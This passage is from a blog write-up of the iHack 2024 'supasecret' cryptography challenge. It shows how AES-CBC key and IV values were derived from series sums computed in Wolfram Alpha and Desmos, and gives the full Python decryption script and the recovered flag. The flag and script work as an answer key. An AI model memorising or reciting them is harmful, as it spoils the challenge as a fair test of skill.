fib_sequence.append(fib_sequence[-<span class="number">1</span>] + fib_sequence[-<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">return</span> fib_sequence[n]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_key1</span>(<span class="params">x</span>):</span><br><span class="line">    sum1 = <span class="built_in">sum</span>(<span class="number">1</span> / (<span class="number">5</span> * k - <span class="number">2</span>) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, x + <span class="number">1</span>))</span><br><span class="line">    sum2 = <span class="built_in">sum</span>(<span class="number">1</span> / (<span class="number">7</span> * k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, x + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> sum1 + sum2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_key2</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="number">1</span> / factorial(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, x + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_key3</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="number">1</span> / k**<span class="number">6</span> <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, x + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_key4</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="number">1</span> / (fibonacci(k)) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, x + <span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<p>Given the Xs,</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Key_X = [<span class="number">10000000000</span>, <span class="number">100</span>, <span class="number">100000000</span>, <span class="number">100</span>] </span><br><span class="line">IV_X = [-<span class="number">100</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure>

<h4 id="Note-of-Effort"><a href="#Note-of-Effort" class="headerlink" title="Note of Effort :"></a>Note of Effort :</h4><p> Before the X values were released, i tried to bruteforce it, since there is 4 keys that is appended with .7f, len(key)&#x3D; 8<em>4&#x3D;32 , with 8 unit length for all 4 parts, same goes for IV, 2 parts with 8 unit length, len(IV)&#x3D;8</em>2. Given the constraint f(x)&lt;10 &amp;&amp; f(x)&gt;-10 , we can find a range of x that could work by plotting it in desmos.. It helps reducing SOME Xs range that need to be calculated, </p>
<p>The example below for IV 1st function, </p>
<p><img src="https://github.com/user-attachments/assets/3e311006-eeb0-49f5-9acc-b9c328f63899" alt="image"></p>
<p><img src="https://github.com/user-attachments/assets/a0991c38-07a7-4ff0-830b-a44f1d15c74b" alt="image"></p>
<p>we can safely assume the X value range for this function is between -∞ to 6. Yeah goodluck calculating that. However we can see that f(x) tends to a number as it approaches -∞, denoted as :</p>
<img src="/images/imageRohman.png">


<p>This is great since we can stop iterating for X when f(x) reaches this value. Alternatively we can iterate X until it gave the same approximation for 7 float points.<br>There is probably a better way to guess the X ranges for each function but this is the best I could come up with, before the hints were released lol. </p>
<h4 id="Compute"><a href="#Compute" class="headerlink" title="Compute"></a>Compute</h4><p>Define the array of functions and run it through the KDF ( Key Derivation Function ).</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KEYs = [compute_key1, compute_key2, compute_key3, compute_key4]</span><br><span class="line">IVs = [compute_iv1,compute_iv2]</span><br><span class="line">Key_X = [<span class="number">10000000000</span>, <span class="number">100</span>, <span class="number">100000000</span>, <span class="number">100</span>] </span><br><span class="line">IV_X = [-<span class="number">100</span>, <span class="number">100</span>]</span><br><span class="line"></span><br><span class="line">key = KDF(KEYs,Key_X)</span><br><span class="line">IV = KDF(IVs,IV_X)</span><br></pre></td></tr></table></figure>
<p>Since it takes some time to calculate i took the liberty to use powerful online calculation tool.. Desmos and Wolfram alpha.<br>I could’ve use Memoization for the fibonacchi function and simplify all the other functions(maybe) but using those platform are much faster.<br>Here is a revised function that returns the value i got from those platforms with reference. Below is the full code in python</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> factorial</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_iv1</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="comment"># return (math.exp(x) + math.exp(1/2)) / 3</span></span><br><span class="line">    <span class="comment"># https://www.wolframalpha.com/input?i2d=true&amp;i=Divide%5BPower%5Be%2C-100%5D%2BPower%5Be%2CDivide%5B1%2C2%5D%5D%2C3%5D</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0.5495737569000427156162169292713878572179253793036359239278129804</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_iv2</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="comment"># return (math.exp(15/6) + math.exp(-x)) / 55</span></span><br><span class="line">    <span class="comment"># https://www.wolframalpha.com/input?i2d=true&amp;i=Divide%5BPower%5Be%2C-100%5D%2BPower%5Be%2CDivide%5B15%2C6%5D%5D%2C55%5D</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0.2214998901946086079649122900212357487851412332229803831230683267</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>(<span class="params">n</span>):</span><br><span class="line">    fib_sequence = [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(fib_sequence) &lt;= n:</span><br><span class="line">        fib_sequence.append(fib_sequence[-<span class="number">1</span>] + fib_sequence[-<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">return</span> fib_sequence[n]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Key 1 computation</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_key1</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="comment"># sum1 = sum(1 / (5 * k - 2) for k in range(2, x + 1))</span></span><br><span class="line">    <span class="comment"># sum2 = sum(1 / (7 * k) for k in range(3, x + 1))</span></span><br><span class="line">    <span class="comment"># return sum1 + sum2</span></span><br><span class="line">    <span class="comment"># https://www.desmos.com/calculator/fbeem92oi4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">7.73754163755</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Key 2 computation</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_key2</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="comment"># return sum(1 / factorial(k) for k in range(3, x + 1))</span></span><br><span class="line">    <span class="comment"># https://www.wolframalpha.com/input?i2d=true&amp;i=++++++Sum%5BDivide%5B1%2Ck%21%5D%2C%7Bk%2C3%2C100%7D%5D</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0.2182818284590452353602874713526</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Key 3 computation</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_key3</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="comment"># return sum(1 / k**6 for k in range(2, x + 1))</span></span><br><span class="line">    <span class="comment"># https://www.wolframalpha.com/input?i2d=true&amp;i=++++++Sum%5BDivide%5B1%2CPower%5Bk%2C6%5D%5D%2C%7Bk%2C2%2C100000000%7D%5D</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0.0173430619844491397145179297909</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Key 4 computation</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_key4</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="comment"># return sum(1 / (fibonacci(k)) for k in range(6, x + 1))</span></span><br><span class="line">    <span class="comment"># https://www.wolframalpha.com/input?i2d=true&amp;i=++++++Sum%5BDivide%5B1%2Cfib%5C%2840%29k%5C%2841%29%5D%2C%7Bk%2C6%2C100%7D%5D</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0.3265523329098442198341101534172</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;\x8d\x91\xa7:\x96\xec\x044I\xb4\nM\x08\x0f\xbf_\xa9\rpR\x86;\xd4y: \x02&#123;\xdc\x82\x8b\xa0\xde5\x85\xe6\xf5\xb3\xab\xd0M\xf0\xfa\xc2\xfd(\xdce&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KDF</span>(<span class="params">KDFs,X</span>):</span><br><span class="line">	key = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(KDFs)):</span><br><span class="line">		result = KDFs[i](X[i])</span><br><span class="line">		key.append(<span class="string">f&quot;<span class="subst">&#123;result:<span class="number">.7</span>f&#125;</span>&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(key).replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">KEYs = [compute_key1, compute_key2, compute_key3, compute_key4]</span><br><span class="line">IVs = [compute_iv1,compute_iv2]</span><br><span class="line">Key_X = [<span class="number">10000000000</span>, <span class="number">100</span>, <span class="number">100000000</span>, <span class="number">100</span>] </span><br><span class="line">IV_X = [-<span class="number">100</span>, <span class="number">100</span>]</span><br><span class="line"></span><br><span class="line">key = KDF(KEYs,Key_X)</span><br><span class="line">IV = KDF(IVs,IV_X)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">flag, key, IV</span>):</span><br><span class="line">    decipher = AES.new(<span class="built_in">bytes</span>(key, <span class="string">&#x27;utf-8&#x27;</span>), AES.MODE_CBC, iv=<span class="built_in">bytes</span>(IV, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    decrypted_padded_plaintext = decipher.decrypt(flag)</span><br><span class="line">    decrypted_plaintext = unpad(decrypted_padded_plaintext, AES.block_size)</span><br><span class="line">    <span class="keyword">return</span> decrypted_plaintext</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypt(flag,key,IV))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>Run the code and we get</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Neno\Downloads\supasecret&gt; python -u <span class="string">&quot;c:\Users\Neno\Downloads\supasecret\supasecret\ansv3.py&quot;</span></span><br><span class="line">b<span class="string">&#x27;ihack24&#123;df65b3be992a84c29d584b01e7afd714&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>The flag is <code>ihack24&#123;df65b3be992a84c29d584b01e7afd714&#125;</code></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Megat Zafran</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://ilikeronnnnii.github.io/2024/08/10/ihack2024/">https://ilikeronnnnii.github.io/2024/08/10/ihack2024/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>peepo pog</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2024/09/08/lekir/">Lekir - Command Injection</a>
            
            
            <a class="next" rel="next" href="/2024/06/24/wanictf/">WaniCTF 2024</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Megat Zafran | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>